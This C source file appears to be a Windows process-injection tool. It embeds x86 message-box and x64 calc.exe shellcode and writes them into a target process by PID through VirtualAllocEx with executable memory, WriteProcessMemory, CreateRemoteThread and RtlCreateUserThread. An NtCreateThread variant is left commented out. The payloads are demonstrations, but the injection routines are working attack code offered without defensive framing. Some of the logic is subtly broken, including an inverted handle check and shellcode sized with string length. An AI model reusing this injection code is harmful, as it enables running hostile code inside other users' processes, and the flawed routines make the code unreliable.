#include <Windows.h>
#include <process.h>
#include "proc.h"
#include "inject.h"



typedef struct _MIMI_CLIENT_ID {
PVOID UniqueProcess;
PVOID UniqueThread;
} CLIENTID;

typedef struct _MIMI_INITIAL_PEB {
    struct {
        PVOID OldStackBase;
        PVOID OldStackLimit;
    } OldInitialTeb;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID StackAllocationBase;
} INITIAL_TEB;

typedef long (__stdcall * p_RtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, int, unsigned long, unsigned long, unsigned long, PTHREAD_START_ROUTINE, void *, PHANDLE, CLIENTID*);
typedef long (__stdcall * p_NtCreateThread)(PHANDLE, ACCESS_MASK, void *, HANDLE, CLIENTID*, PCONTEXT, INITIAL_TEB*,BOOL);

static p_NtCreateThread _NtCreateThread = NULL;
static p_RtlCreateUserThread _RtlCreateUserThread = NULL;
static BOOL m_RtlCreateUserThreadAttempted = FALSE;

unsigned char shellcode_msgbox[] = 
	"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
	"\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
	"\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
	"\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
	"\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
	"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
	"\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
	"\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
	"\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
	"\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
	"\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
	"\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
	"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
	"\xe8\x61\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67\x65\x42"
	"\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3\x68\x58"
	"\x20\x20\x20\x68\x4d\x53\x46\x21\x68\x72\x6f\x6d\x20\x68\x6f"
	"\x2c\x20\x66\x68\x48\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89"
	"\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08";

unsigned char shellcode_exec_x64[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
"\x63\x2e\x65\x78\x65\x00";

int __inject_rthread(int pid) {
	HANDLE hProcess = (HANDLE)0x4a4a4a4a;
	HANDLE hThread = (HANDLE)0x4a4a4a4a;
	void *lpRemoteCode = (void *)0x4a4a4a4a;
	int code_len = lstrlenA((char *)shellcode_msgbox);
	DWORD thID = NULL;


	if((hProcess = __open_process(pid))) {
		return 1;
	}


	if(!(lpRemoteCode = VirtualAllocEx(hProcess, NULL, code_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
			return -1;
	}

	if(!WriteProcessMemory(hProcess, lpRemoteCode, shellcode_msgbox, lstrlenA((char *)shellcode_msgbox), NULL)) {
			return -1;
	}


	if((hThread = CreateRemoteThread(hProcess, NULL, lstrlenA(shellcode_msgbox), (LPTHREAD_START_ROUTINE)lpRemoteCode, (void *)0, CREATE_SUSPENDED, &thID))) {
		ResumeThread(hThread);
	}
	
	if(hProcess)
		CloseHandle(hProcess);

	if(hThread)
		CloseHandle(hThread);	

	

	return 0;

}

int __inject_rthread_rtl(int pid) {
	HANDLE hProcess = (HANDLE)0x4a4a4a4a;
	HANDLE hThread = (HANDLE)0x4a4a4a4a;
	void *lpRemoteCode = (void *)0x4a4a4a4a;
	void *remote_main = (void *)0x4a4a4a4a;
	unsigned long size = 0x4a4a4a4a;
	unsigned long thID = 0xFFFFFFFF;
	unsigned long result = 0x4a4a4a4a;
	CLIENTID cliID = {0};
	CONTEXT thContext = {0};
	INITIAL_TEB teb = {0};
	int code_len = lstrlenA((char *)shellcode_msgbox);
	
	

	if((hProcess = OpenProcess(	PROCESS_DUP_HANDLE|PROCESS_VM_OPERATION|
					PROCESS_VM_WRITE|PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
					FALSE,pid))==0) {
			if((hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid))==0)
				return -1;
	}


	
	if(!(lpRemoteCode = VirtualAllocEx(hProcess, NULL, code_len, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE))) {
			return -1;
	}

	if(!WriteProcessMemory(hProcess, lpRemoteCode, shellcode_msgbox, lstrlenA((char *)shellcode_msgbox), NULL)) {
			return -1;
	}

	
	else {

		VirtualProtectEx(hProcess, lpRemoteCode, lstrlenA((char *)shellcode_msgbox), PAGE_EXECUTE_READWRITE,NULL);
		

		_RtlCreateUserThread = (p_RtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");
		_RtlCreateUserThread(hProcess, 0,0,0,0,0, (PTHREAD_START_ROUTINE)lpRemoteCode, 0, &hThread, &cliID);
		//printf("Thread: %d\n", GetThreadId(hThread));
		if(hThread) {
			ResumeThread(hThread);
		}

		return 1;
	}


	return 0;
}

/*

		else {
			thContext.Eip=*(DWORD *)&lpRemoteCode;
			_NtCreateThread = (p_NtCreateThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThread");	
			_NtCreateThread(&hThread, THREAD_ALL_ACCESS,NULL,hProcess,&cliID, &thContext, &teb,FALSE);
		}
			

*/